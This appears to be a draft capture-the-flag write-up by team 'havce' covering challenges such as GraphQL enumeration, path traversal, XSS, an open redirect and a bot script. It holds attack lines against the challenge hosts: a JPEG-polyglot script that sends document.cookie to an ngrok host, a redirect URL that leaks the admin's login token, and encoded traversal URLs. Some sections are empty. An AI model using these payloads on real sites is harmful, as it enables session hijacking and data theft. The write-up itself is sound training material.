---
title: "{{ replace .Name "-" " " | title }}"
date: {{ .Date }}
draft: true
tags: ["pwn", "rev"]
author: havce
---

| Challenge | Category | Points |
| --- | ----------- | --- |
| [Door (un)Locked](#door-unlocked) | web | 100 | 
| [Careers](#careers) | web | 100 |
| [GraphiCS](#graphics) | web | 150 |
| [Etulosba](#etulosba) | web | 200 |
| [Darknet Club](#darknet-club) | web | 200 |
| [Flag Vault](#flag-vault) | web | 250 |
| [Mass Notes](#mass-notes) | web | 250 |
| [Pattern Institute](#patterni) | pwn | 450 |
| [Scadomware](#scadomware) | rev | 300 |
| [Electron](#electron) | bot | 50 |


# Door (un)Locked
### Description


### Solution



# Careers
### Description


### Solution



# GraphiCS
### Description
The challenge presents a website that makes a single query to a GraphQL endpoint. We probably need to extract the flag from there.

### Solution
Immediately tried introspection, but it was disabled. Luckily we can abuse the autocorrection feature and this tool: https://github.com/nikitastupin/clairvoyance/, using a decent word list will reveal that we can use this query to get the flag:

```json
{"operationName":"ExampleQuery","variables":{},"query":"query ExampleQuery { _secret { flag } }\n"}
```


# Etulosba
### Description
We are provided with the source code of what supposedly is a CDN: 

```javascript
const fs = require("fs");
const path = require("path");
const express = require("express");

const server = express();

server.get("/", function (req, res) {
    res.end("<html><body>etulosba</body></html>");
});

server.get("/files/images/:name", function (req, res) {
    if (req.params.name.indexOf(".") === -1) {
        return res.status(400).json({ error: "invalid file name" });
    }

    res.sendFile(__dirname + path.join("/files/images/", req.params.name));
});

server.get("/files/binary/:name", function (req, res) {
    if (req.params.name.indexOf(".") !== -1) {
        return res.status(400).json({ error: "invalid file name" });
    }

    res.sendFile(path.resolve(__dirname, "/files/binary/", req.params.name));
});

fs.writeFileSync(path.join(__dirname, "flag.name"), process.env.FLAG_NAME);
fs.writeFileSync(path.join("/tmp", process.env.FLAG_NAME), process.env.FLAG);

server.listen(process.env.HTTP_PORT);
```

### Solution
By quickly looking at the code we can see the usage of `path.join` and `path.resolve` with user input which can be quite dangerous. Indeed the two endpoints provide two vulnerabilities: we can first read the `flag.name` file by requesting `https://etulosba.chal.intentsummit.org/files/images/%2E%2E%2F%2E%2E%2Fflag%2Ename` and then query it's contents with `https://etulosba.chal.intentsummit.org/files/binary/%2Ftmp%2Fimaflagimaflag`


# Darknet Club
### Description
The challenge let us register an account and then present us a simple profile page with the ability to ask the "admin" to review our profile. This looked like an XSS challenge.

### Solution
First we checked all inputs to see whether they were sanitized and indeed the referral input wasn't. I quickly tried an XSS payload to steal the admin's cookies, but realized CSP was enabled and that we needed some other way. At that point I realized I could upload a profile picture, but that required a JPEG file which appeared to be checked for the magic bytes only. At this point the route was clear:

1) Upload a "valid" JPEG file that's also a malicious JS script:

```javascript
ÿØÿî = 1;
location.href="//xxxx-xx-xx-xx-xx.ngrok.io?cookies="+document.cookie;
```

2) Set the referral to load the image as the script:

```html
<script src="https://darknet-club.chal.intentsummit.org/api/avatar/havce_test"></script>
```

3) Request a review by the admin


# Flag Vault
### Description
The challenge contains a simple login page that seems to never login and is not vulnerable to basic SQLi. JWT tokens also look same after a bit of fuzzing.

### Solution
The report button suggests we probably need to send a malicious URL to the "admin". Seems easy, but it appears to check the domain of the URL to be the same of website the challenge is on. Upon visiting `/admin`, we are redirected to `/?redirect=/admin&error=INVALID_TOKEN` which probably means we will be redirect to the given URL upon successful login (something we cannot test). Checking the redirect login we can see it's not very safe:

```javascript
window.location = location.origin + redirectTo + "?token=" + jsonData.token;
```

Because it is done with simple concatenation we can use the `@` trick to fool the admin's browser into redirecting him to a malicious link with the token as a query parameter when he logs in (which he does!):

https://flag-vault.chal.intentsummit.org/?redirect=@xxxx-xx-xx-xx-xx.ngrok.io/

After receiving the token, which expires in 10 seconds, we can quickly login and get the flag. 


# Mass Notes
### Description
The app simply lets us create notes which are stored on a MongoDB server. I spent a lot of time investigating a possible MongoDB injection, but that wasn't it (sort of).

### Solution
A common problem with MongoDB (and NoSQL) implementations is being able to override parameters set in the code with ones of our choice. We can override a couple, but most notably `avatar`. By messing with a bit, we can see that the avatar for our notes is not visible anymore and that an error is returned instead. `../../flag` appears to be a good avatar to get the flag!


# Pattern Institute
### Description


### Solution



# Scadomware
### Description


### Solution



# Electron
### Description
The challenge required to write a simple bot program to get the flag very quickly.


### Solution
With a bit of reverse engineering of the `merge` function and the rude fingerprinting code, we can write such a script to get the flag:

```python
import re
import requests


def merge(in1, in2):
    out = ''
    for i in range(len(in1)):
        out += in1[i] + in2[i % min(len(in1), len(in2))]

    return out


resp = requests.get('https://electron.chal.intentsummit.org/start?id=1', verify=False)
product_id = int(re.findall(r'/get_limited_item/(\d+)', resp.text)[0])
if product_id % 2 == 0:
    product_id = product_id // 2
else:
    product_id = product_id * 3 + 1

print('PRODUCT', product_id)

resp = requests.get(f'https://electron.chal.intentsummit.org/get_limited_item/{product_id}', verify=False)
if 'Sorry, bot are not allowed on our website' in resp.text:
    print('RETRY')
    exit(1)

secret = re.findall(r'<input type="hidden" value="(.*?)" style="visibility: hidden" id="secret" name="secret">', resp.text)[0]
print('SECRET', secret)

sig = merge('343d9040a671c45832ee5381860e2996', secret)
print('SIG', sig)

resp = requests.post('https://electron.chal.intentsummit.org/send_offer', data={
    'Do you like spicy potatoes ?': 'yes',
    'Do you like sausages ?': 'yes',
    'Are you sure ?': 'yes',
    'secret': secret,
    'sig': sig,
}, verify=False)
print(resp.status_code, resp.text)
```